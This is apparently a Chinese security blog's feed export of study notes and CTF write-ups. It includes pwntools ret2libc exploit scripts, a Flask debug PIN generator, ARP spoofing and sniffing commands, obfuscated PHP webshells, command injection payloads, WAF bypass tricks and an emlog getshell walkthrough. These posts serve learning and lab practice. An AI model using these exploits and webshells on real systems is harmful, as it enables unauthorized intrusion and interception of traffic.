    <url>%2F2019%2F01%2F25%2FWaf%E9%82%A3%E4%BA%9B%E4%BA%8B%2F</url>
    <content type="text"><![CDATA[介绍wafWaf是Web应用防火墙通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品 Waf通常有以下几类： 软件型waf以软件形式装在所保护的服务器上的waf，由于安装在服务器上，所以可以接触到服务器上的文件，直接检测服务器上是否存在webshell，是否有文件被创建等。 硬件型waf以硬件形式部署在线路中，支持多种部署方式，当串联到链路中时可以拦截恶意流量，在旁路监听模式时只记录攻击不进行拦截。 云waf一般以反向代理的形式工作，通过配置NS记录或CNAME记录，使对网站的请求报文优先经过waf主机，经过waf主机的过滤后，将认为无害的请求报文再发送给实际网站服务器进行请求，可以说是带防护功能的CDN 网站系统内置的waf网站系统内置的waf可以说是网站内置的过滤，直接镶嵌在代码中，相对来说自由度高，一般有以下几种情况： 输入参数强制类型转换 输入参数合法性检测 关键函数执行前，对经过代码流程的输入进行检测 对输入的数据进行替换后在继续执行代码流程 网站系统内置的waf与业务更加契合，在对安全与业务都比较了解的情况下，可以更少的收到误报与漏报。 waf判断判断网站是否存在waf主要有下面几种方法： sqlmap使用sqlmap自带的waf识别模块可以识别出waf的种类，想要了解详细的识别规则可以查看sqlmap的waf目录下的相关脚本，也可以按照其格式自主添加新的waf识别规则，写好规则文件后直接放到waf目录下即可 手工判断这个也比较简单，直接在相应网站的URL后面加上最基础的测试语句，比如union select 1,2,3%23 ,并且放在一个不存在的参数名中。 被拦截的表现为：页面无法访问，响应码不同，返回与正常请求网页时不同的结果等。 一些waf的绕过方法大小写混合在规则匹配时只针对了特定大写或特定小写的情况，在实战中可以通过混合大小写的方式进行绕过（现在几乎没有这样的情况） URL编码 极少数的waf不会对普通字符进行URL解码 还有一种情况就是URL二次编码，waf一般只进行一次解码，如果目标web系统的代码中进行了额外的URL解码，即可进行绕过。 替换关键字waf采用替换或者删除select/union这类敏感关键词的时候，如果只匹配一次则很容易绕过。 使用注释注释在截断sql语句中用的比较多，在绕过waf时主要使用其代替空格（/**/），适用于检测过程中没有识别注释或者替换掉了注释的waf。 多参数请求拆分对于多个参数拼接到同一条sql语句中的情况，可以将注入语句分割插入。 生僻函数使用生僻函数替代常见的函数，例如在报错注入中使用polygon()函数替换常用的updatexml()函数 寻找网站源站ip对于有云waf防护的网站而言，只要找到网站的ip地址，然后通过ip访问网站，就可以绕过云waf检测 常见的寻找网站ip的方法如下: 寻找网站的历史解析记录 多个不同区域ping网站，查看ip解析结果 寻找网站二级域名，NX，MX记录对应的ip 订阅网站邮件，查看邮件发送方的ip]]></content>
      <tags>
        <tag>读书心得</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn学习笔记-ret2libc3]]></title>
    <url>%2F2019%2F01%2F24%2Fpwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-ret2libc3%2F</url>
    <content type="text"><![CDATA[在ret2libc2的基础上，将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护 程序仍然开启了NX 拖入ida中查看 int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;No surprise anymore, system disappeard QQ.&quot;); printf(&quot;Can you find it !?&quot;); gets(&amp;s); return 0; } 仍然是在gets函数处利用，但是在程序中现在没有了system函数和/bin/sh字符串 这里就需要了解一下libc的作用 system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序开启了ALSR，但是程序的低3位地址是不会变的，我们可以泄露出某个执行过的函数的低三位地址进而确定libc的版本 泄露某个函数的地址我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。 脚本如下： from pwn import * context.log_level = &apos;debug&apos; p = process(&apos;./ret2libc3&apos;) elf = ELF(&apos;./ret2libc3&apos;) p.sendlineafter(&apos;!?&apos;,&apos;a&apos;*112+p32(elf.plt[&apos;puts&apos;])+&apos;aaaa&apos;+p32(elf.got[&apos;puts&apos;])) p.interactive() 我们可以通过此处泄露puts函数的地址 可以看到地址的低三位为ca0 下面我们可以确定libc的版本，我们可以用到LibcSearcher github地址为https://github.com/lieanu/LibcSearcher 当然这个工具的强大之处不只如此，我们可以把它当做第三方库来使用 引用说明文档的例子 from LibcSearcher import * #第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型 obj = LibcSearcher(&quot;fgets&quot;, 0X7ff39014bd90) obj.dump(&quot;system&quot;)#system 偏移 obj.dump(&quot;str_bin_sh&quot;)#/bin/sh 偏移 obj.dump(&quot;__libc_start_main_ret&quot;) 所以得到了libc的版本后，我们就可以获得libc中system函数和/bin/sh的地址 将LibcSearcher作为第三方库，最后的脚本为： from pwn import * from LibcSearcher import LibcSearcher p = process(&apos;./ret2libc3&apos;) elf = ELF(&apos;./ret2libc3&apos;) p.sendlineafter(&apos;!?&apos;,&apos;a&apos;*112+p32(elf.plt[&apos;puts&apos;])+p32(0x08048618)+p32(elf.got[&apos;puts&apos;])) puts_addr = u32(p.recv(4)) libc = LibcSearcher(&apos;puts&apos;,puts_addr) libc_base = puts_addr - libc.dump(&apos;puts&apos;) system_addr = libc_base + libc.dump(&apos;system&apos;) binsh = libc_base + libc.dump(&apos;str_bin_sh&apos;) p.sendlineafter(&apos;!?&apos;,&apos;a&apos;*112+p32(system_addr)+p32(0x08048618)+p32(binsh)) p.interactive() 调用完puts函数后我们让该函数返回到程序的主函数处脚本执行需要等待一会，可能是寻找libc较费时间 成功获得了shell]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn学习笔记-ret2libc2]]></title>
    <url>%2F2019%2F01%2F23%2Fpwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-ret2libc2%2F</url>
    <content type="text"><![CDATA[查看程序保护机制 拖入ida查看 int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;Something surprise here, but I don&apos;t think it will work.&quot;); printf(&quot;What do you think ?&quot;); gets(&amp;s); return 0; } 和ret2libc1一样，都是通过gets函数进行攻击 查看程序是否存在system 函数 void secure() { unsigned int v0; // eax int input; // [esp+18h] [ebp-10h] int secretcode; // [esp+1Ch] [ebp-Ch] v0 = time(0); srand(v0); secretcode = rand(); __isoc99_scanf((const char *)&amp;unk_8048760, &amp;input); if ( input == secretcode ) system(&quot;no_shell_QQ&quot;); } 寻找是否有/bin/sh字符串，但是该程序中并不存在 这里就涉及到了最基本的ROP技术 所以需要我们自己来读取字符串，我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“/bin/sh”) exp: from pwn import * rop = ROP(&apos;./ret2libc2&apos;) p = process(&apos;./ret2libc2&apos;) elf = ELF(&apos;./ret2libc2&apos;) p.sendline(&apos;a&apos;*112+p32(elf.plt[&apos;gets&apos;])+p32(rop.search(8).address)+p32(elf.bss()+0x100)+p32(elf.plt[&apos;system&apos;])+&apos;aaaa&apos;+p32(elf.bss()+0x100)) p.sendline(&apos;/bin/sh&apos;) p.interactive() 其中 rop.search(8).address 是pwntools自带寻找gadgets的方法 成功获得权限]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn学习笔记-ret2libc1]]></title>
    <url>%2F2019%2F01%2F22%2Fpwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-ret2libc1%2F</url>
    <content type="text"><![CDATA[试着运行程序 程序只有一个输入点，检查程序 程序开启了NX，拖进ida查看 int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;RET2LIBC &gt;_&lt;&quot;); gets(&amp;s); return 0; } 这里同样有gets函数，并且经检测需覆盖字符仍为112 发现了内置的system函数 void secure() { unsigned int v0; // eax int input; // [esp+18h] [ebp-10h] int secretcode; // [esp+1Ch] [ebp-Ch] v0 = time(0); srand(v0); secretcode = rand(); __isoc99_scanf(&quot;%d&quot;, &amp;input); if ( input == secretcode ) system(&quot;shell!?&quot;); } 但是并没有/bin/sh ,接着在ida中寻找/bin/sh 可以看到在0x08048720处存在/bin/sh 下面就可以构造exp了 from pwn import * p = process(&apos;./ret2libc1&apos;) elf = ELF(&apos;./ret2libc1&apos;) p.sendline(&apos;a&apos;*112+p32(elf.plt[&apos;system&apos;])+&apos;aaaa&apos;+p32(0x08048720)) p.interactive() 其中 &apos;a&apos;*112+p32(elf.plt[&apos;system&apos;])+&apos;aaaa&apos;+p32(0x08048720) 这里的aaaa是执行system后的返回地址，因为执行完system后我们就获取了shell，所以返回地址就用不到了，可以随意写 可以看到成功获得了shell]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn学习笔记-ret2text]]></title>
    <url>%2F2019%2F01%2F21%2Fpwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-ret2text%2F</url>
    <content type="text"><![CDATA[查看程序基本信息 开启了NX，代表着栈上的数据是不可执行的 运行程序看一下 程序只有一个输入点，下面将程序拖入ida int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;There is something amazing here, do you know anything?&quot;); gets(&amp;s); printf(&quot;Maybe I will tell you next time !&quot;); return 0; } 看到了无输入限制的gets函数，我们接下来计算一下程序gets函数的返回地址 可以看到地址是0x62616164，下面计算我们需要填充的字节数 需要填充112个无用字符 接下来我们在ida中查看是否存在/bin/sh 在地址0x0804863A处存在/bin/sh 接下来编写shell脚本 from pwn import * p = process(&quot;./ret2text&quot;) p.recvuntil(&apos;anything?\n&apos;) p.sendline(&apos;a&apos;*112+p32(0x0804863A)) p.interactive() 成功获得权限]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[flask debug模式下pin码安全]]></title>
    <url>%2F2019%2F01%2F20%2Fflask-debug%E6%A8%A1%E5%BC%8F%E4%B8%8Bpin%E7%A0%81%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[flask在开启debug模式时其会生成一个pin码，在同一台机器上，多次重启Flask服务，PIN码值不改变。 这说明PIN码是经过运算生成而不是随机生成的，经过网络搜索，我找到了生成pin 码的流程，生成的pin 码主要由6个值决定的 当前计算机的用户名 flask.app Flask E:\flask-file\flask\lib\site-packages\flask\app.py 当前计算机网卡的Mac地址(linux下获取该值可以访问：/sys/class/net/eth0(eth1,ens33,eth2)/address) win下SOFTWARE\Microsoft\Cryptography注册表的值或者Linux下某个固定文件的值（Linux下访问/etc/machine-id 或 /proc/sys/kernel/random/boot_id） 在默认配置里找到代码并将其修改，得到猜解pin码的脚本 import hashlib from itertools import chain def get_pin(mac): probably_public_bits = [ &apos;SUN&apos;,# username &apos;flask.app&apos;,# modname &apos;Flask&apos;,# getattr(app, &apos;__name__&apos;, getattr(app.__class__, &apos;__name__&apos;)) &apos;E:\\flask-file\\flask\\lib\\site-packages\\flask\\app.py&apos; # getattr(mod, &apos;__file__&apos;, None), ] private_bits = [ mac ,#&apos;55069833074577&apos;,# str(uuid.getnode()), /sys/class/net/eth0(eth1,ens33,eth2)/address &apos;2aa76823-5ed2-44aa-97de-ac3f97b955e2&apos;# get_machine_id(), /etc/machine-id , /proc/sys/kernel/random/boot_id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&apos;utf-8&apos;) h.update(bit) h.update(b&apos;cookiesalt&apos;) cookie_name = &apos;__wzd&apos; + h.hexdigest()[:20] num = None if num is None: h.update(b&apos;pinsalt&apos;) num = (&apos;%09d&apos; % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &apos;-&apos;.join(num[x:x + group_size].rjust(group_size, &apos;0&apos;) for x in range(0, len(num), group_size)) break else: rv = num print(rv) if __name__ == &apos;__main__&apos;: maclist = [&apos;55069833074577&apos;,&apos;1099493587180&apos;,&apos;115366132066698&apos;,&apos;117565155322249&apos;,&apos;345052807176&apos;,&apos;115366132066697&apos;] for mac in maclist: get_pin(mac) 这里用本地环境验证一下 故意将代码写错以触发debug模式 点击最右侧的小图标会让我们输入pin码 现在我们开始计算PIN码 用户名：SUN flask.app Flask E:\flask-file\flask\lib\site-packages\flask\app.py [‘55069833074577’,’1099493587180’,’115366132066698’,’117565155322249’,’345052807176’,’115366132066697’] 2aa76823-5ed2-44aa-97de-ac3f97b955e2 运行脚本会计算出6个pin 码 231-484-767 177-131-120 142-563-096 112-007-296 244-772-099 236-421-014 经过测试,244-772-099是正确的pin码 linux下调试可用： import os os.popen(&quot;ls /&quot;).read() 这里有几个坑需要注意一下： E:\flask-file\flask\lib\site-packages\flask\app.py windows下是不区分大小写的，有时应将路径的大写字母改为小写字母 E:\flask-file\flask\lib\site-packages\flask\app.py 这个路径有时也会是E:\flask-file\flask\lib\site-packages\flask\app.pyc Linux下，第六个数值在获取时，当/etc/machine-id文件显示无任何内容时，可能是该文件为空或者是不存在，这两者是有区别的，当该文件为空时，第六个数值就是“” 而当文件不存在时，第六个数值是/proc/sys/kernel/random/boot_id文件的值]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ARP欺骗原理及实例]]></title>
    <url>%2F2019%2F01%2F19%2FARP%E6%AC%BA%E9%AA%97%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[arp协议简介arp是一种地址转换协议，在以太网中，网络设备之间相互通信是用Mac地址进行数据交流，而arp协议就是吧IP地址转换成Mac地址的 arp欺骗原理每台机器都会有一张arp缓存表，缓存表记录了ip地址与Mac地址的对应关系，在同一局域网中，A主机与B主机通信需要经过网关，但是arp缓存表存在一个缺陷，当主机收到arp应答包后，不会验证自己是否向对方主机发送过arp请求包，而是直接将返回包中的ip和Mac地址对应的关系添加到arp缓存表中。 实例复现这里使用一台winxp和kali虚拟机 ip分别是192.168.18.131,192.168.18.135 这里我们为的是侦测到目标机的某些网络活动，所以在开始欺骗之前需要开启ip转发，不然在操作时目标主机会出现断网的情况 echo 1 &gt; /proc/sys/net/ipv4/ip_forward kali下arp攻击工具是arpspoof，具体的命令可在百度上查询到或者使用arpspoof -h 查看口令 arpspoof -i eth0 -t 192.168.18.131 192.168.18.135 开始修改目标机上的缓存表 开始嗅探目标机上的网络活动 dsniff -i eth0 这就完成了一次arp欺骗攻击，我们就可以捕捉到目标机的网络活动了]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无数字和字母的webshell]]></title>
    <url>%2F2019%2F01%2F18%2F%E6%97%A0%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell%2F</url>
    <content type="text"><![CDATA[先看一下这个例子 &lt;?php if(!preg_match(&apos;/[a-z0-9]/is&apos;,$_GET[&apos;shell&apos;])) { eval($_GET[&apos;shell&apos;]); } 这算是一个极限利用了，要求我们不用数字和字母构造webshell 这样的问题我们可以类比于各类变形的一句话木马，用异或的方式得到一个新的字符，这时我们就可以用非数字和字母的字符串将数字或者字母异或出来 异或例如这个 &lt;?php $_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;); // $_=&apos;assert&apos;; $__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;; $___=$$__; $_($___[_]); // assert($_POST[_]); 部分数字是由于URL编码的原因，实际上是不包含数字的 取反运算还有一种方法我们可以使用~取反运算 例如这个 &lt;?php $__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;); $_=$__/$__; $____=&apos;&apos;; $___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__}); $_____=&apos;_&apos;;$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_}); $_=$$_____; $____($_[_]);// assert($_POST[_]); 原理就是用UTF-8编码的汉字，将其中的某个字符取出，然后取反，就可以得到想要的字母 自增运算例如这个 &lt;?php @$_=[].&apos;&apos;; @$___=$_[&apos;&apos;]; $_=$___;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__; $__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; $____=&apos;_&apos;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____; @$___($_[_]);// assert($_POST[_]); ?&gt; 我们可以拿到一个为a的变量，通过自增操作，即可获得a-z的任意一个字符，’a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’,’c’++ =&gt; ‘d’ 而在PHP中，数组和字符串若强制连接的话，数组也就会转换成字符串，即array 所以我们取字符串的第一个字母就可以得到a了]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[命令执行漏洞小结]]></title>
    <url>%2F2019%2F01%2F17%2F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[当应用程序调用一些可执行命令的函数，如PHP中 eval assert systempreg_replace call_user_func 等等函数，当函数参数变成可控参数时就可以将恶意的命令拼接到正常命令中，造成命令执行 这里在本地搭建了dvwa 环境进行漏洞的测试 进入命令执行测试界面 输入点输入ip可以执行ping命令 接下来看一下源代码(low) &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $target = $_REQUEST[ &apos;ip&apos; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int&apos;s put the IP back together. $target = $octet[0] . &apos;.&apos; . $octet[1] . &apos;.&apos; . $octet[2] . &apos;.&apos; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } else { // Ops. Let the user name theres a mistake echo &apos;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&apos;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 代码对于输入的命令没有温和过滤，可以利用管道符来执行我们想执行的命令 Linux常见的管道符这里也做一下总结： “；”：执行完前面的语句在执行后面的 “|”：显示后面语句的执行结果 “||”：当前面语句执行出错时，执行后面的语句 “&amp;”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假 “&amp;&amp;”：如果前面的语句为假则直接出错，不执行后面的，前面的语句只能为真 这里我们输入127.0.0.1|whoami 成功的执行了“|”后面的命令 然后分别查看medium和high级别的黑名单代码段 可以看到medium等级只过滤了“&amp;&amp;”和“；” ，我们仍然可以用“|”绕过 对于high等级，我们可以用127.0.0.1&amp;|&amp;whoami进行绕过 命令执行常出现在可以执行某些命令的模块，并且该模块具有可控的输入点，如果过滤做的没有那么完整，很可能触发命令执行漏洞 几点避免命令执行漏洞的建议 尽量不要使用命令执行函数 客户端提交的变量在进入命令执行函数前要做好过滤和检测 对于PHP语言，不能完全控制的危险函数最好不要用]]></content>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[file_put_contents()的妙用]]></title>
    <url>%2F2019%2F01%2F16%2Ffile-put-contents-%E7%9A%84%E5%A6%99%E7%94%A8%2F</url>
    <content type="text"><![CDATA[今天偶然在群里看到这个骚操作 file_put_contents()第二个参数是可以传入数组的，那么在存在某些正则校验的时候，就可能带来绕过的可能 例如有如下代码 &lt;?php $text = $_GET[&apos;text&apos;]; if(preg_match(&apos;[&lt;&gt;?]&apos;, $text)) { die(&apos;fuck!!!!&apos;); } file_put_contents(&apos;shell.php&apos;, $text); 如果我们想写入一个php文件,正常的话传入 text = &lt;?php phpinfo(); 会被正则匹配到，无法写入 如果我们将本段代码以数组的形式传入，数组会强制转化为字符串，这样就绕过了正则的匹配，达到了getshell的目的 虽然出现了Warning，但是文件是被写入了的]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP利用回溯次数限制绕过]]></title>
    <url>%2F2019%2F01%2F15%2FPHP%E5%88%A9%E7%94%A8%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[回溯绕过这里以i春秋圣诞欢乐赛中一道题为例代码如下 &lt;?php function areyouok($greeting){ return preg_match(&apos;/Merry.*Christmas/is&apos;,$greeting); } $greeting=@$_POST[&apos;greeting&apos;]; if(!areyouok($greeting)){ if(strpos($greeting,&apos;Merry Christmas&apos;)!==false){ echo &apos;Merry Christmas. &apos;.&apos;flag{259efcb4-bb57-4967-8aa8-8271f04f655a}&apos;; }else{ echo &apos;Do you know .swp file?&apos;; } }else{ echo &apos;Do you know PHP?&apos;; } ?&gt; 题目虽然有更简单的解法，但是为了说明问题，我们来讨论如何绕过正则 PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限，这个上限默认是100万 所以当我们向其发送100万个a然后在发送Merry Christmas就可以绕过正则的校验，函数会返回NULL，也就符合了题目要求 什么是正则表达式比较规范的说法是：正则表达式是一个可以被“有限状态自动机”接受的语言类。 常见的正则引擎有DFA和NFA，分别叫做确定性有限状态自动机和非确定性有限状态自动机 其中NFA的执行过程存在回溯，PHP就使用了NFA引擎，其中PCRE库属于NFA引擎]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018安恒12月赛复现]]></title>
    <url>%2F2019%2F01%2F13%2F2018%E5%AE%89%E6%81%9212%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[WEBeasy题目是如下代码 &lt;?php @error_reporting(1); include &apos;flag.php&apos;; class baby { public $file; function __toString() { if(isset($this-&gt;file)) { $filename = &quot;./{$this-&gt;file}&quot;; if (file_get_contents($filename)) { return file_get_contents($filename); } } } } if (isset($_GET[&apos;data&apos;])) { $data = $_GET[&apos;data&apos;]; preg_match(&apos;/[oc]:\d+:/i&apos;,$data,$matches); if(count($matches)) { die(&apos;Hacker!&apos;); } else { $good = unserialize($data); echo $good; } } else { highlight_file(&quot;./index.php&quot;); } ?&gt; 很显然是一个反序列化漏洞 将参数改为flag.php即可读取到flag文件 生成poc的代码如下 &lt;?php @error_reporting(1); class baby { public $file = &quot;flag.php&quot;; function __toString() { if(isset($this-&gt;file)) { $filename = &quot;./{$this-&gt;file}&quot;; if (file_get_contents($filename)) { return file_get_contents($filename); } } } } $a = new baby(); echo serialize($a); ?&gt; 本地访问页面生成的反序列化字符串为： O:4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 将该串内容作为data的值传入，发现被waf拦截 仔细查看题目正则部分，用+4绕过即可 ezweb2使用御剑扫描目录发现了admin.php文件，访问后提示： 提示不是admin，下意识的查看cookie 将user部分base64解码得到user,我们将admin base64编码后将其替换 进入到后台 发现可以命令执行，但是过滤了空格 空格可以使用$IFS绕过 ls$IFS/ 读取flag文件 MISC学习资料拿到文件后很明显是明文攻击 跑出密码 打开解压后的Word文档，将图片移走，得到flag JUJU题目提示有11只猪，而打开图片明显数量不足，尝试修改图片高度 发现了base32编码 解密后得到flag]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP反序列化总结]]></title>
    <url>%2F2019%2F01%2F12%2FPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[漏洞成因Demo： &lt;?php class A{ public $target = &quot;demo&quot;; function __destruct(){ echo &quot;destructing!&lt;br/&gt;&quot;; echo $this-&gt;target.&quot;&lt;br/&gt;&quot;; echo &quot;destructed!&lt;br/&gt;&quot;; } } $a = $_GET[&apos;test&apos;]; $a_unser = unserialize($a); ?&gt; 在这里我们可以构造一个对象，控制$test的值，以实现控制数据流的目的 生成序列化字符串： &lt;?php class A{ public $target = &quot;w2t3rp2dd13r&quot;; } $a = serialize(new A); echo $a; ?&gt; 常见绕过方式_wakeup绕过： wakeup()是用在反序列化操作中。unserialize()会检查存在一个wakeup()方法。如果存在，则先会调用__wakeup()方法。 &lt;?php class A{ function __wakeup(){ echo &apos;Hello&apos;; } } $c = new A(); $d=unserialize(&apos;O:1:&quot;A&quot;:0:{}&apos;); ?&gt; 存在wakeup函数，所以会输入hello &lt;?php class Student{ public $full_name = &apos;zhangsan&apos;; public $score = 150; public $grades = array(); function __wakeup() { echo &quot;__wakeup is invoked&quot;; } } $s = new Student(); var_dump(serialize($s)); ?&gt; 这里会输出student的实例序列化字符串 O:7:&quot;Student&quot;:3:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}} student后的3代表该类存在3个属性 而当该属性大于真实值时代码就会跳过_wakeup()函数执行 所以当输入序列化字符串为： O:7:”Student”:4:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}} 时，就不会执行_wakeup()函数。]]></content>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[emlog后台数据备份getshell]]></title>
    <url>%2F2019%2F01%2F11%2Femlog%E5%90%8E%E5%8F%B0%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BDgetshell%2F</url>
    <content type="text"><![CDATA[此漏洞适用版本&lt;= 5.1.2 漏洞原理是通过在恢复数据库备份时插入恶意代码，以达到getshell的目的 首先登陆到博客后台，进入数据备份和恢复功能 点击开始备份，我们会在本地生成一个数据库文件 要getshell，我们可以在得到的数据库文件中插入生成恶意文件的代码，但是我们需要知道该站点在服务器中的绝对路径 经过审计发现在admin/index.php中存在如下代码 这样我们只需访问127.0.0.1/admin/index.php?action=phpinfo就可以触发phpinfo()函数进而得到绝对路径了 有了绝对路径我们就可以在数据库备份文件中插入如下代码 这里调用了mysql语句，在目录下生成yml.php的文件 把代码插入到数据备份中 再次进入emlog后台，利用数据恢复功能，将修改过的备份文件导入 我们看下admin录下是否存在yml.php文件 可以看到成功在admin目录下生成了可执行PHP文件，在实战中可将该文件变成一句话木马，进行下一步的操作]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn简单栈溢出]]></title>
    <url>%2F2018%2F11%2F30%2Fpwn%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%2F</url>
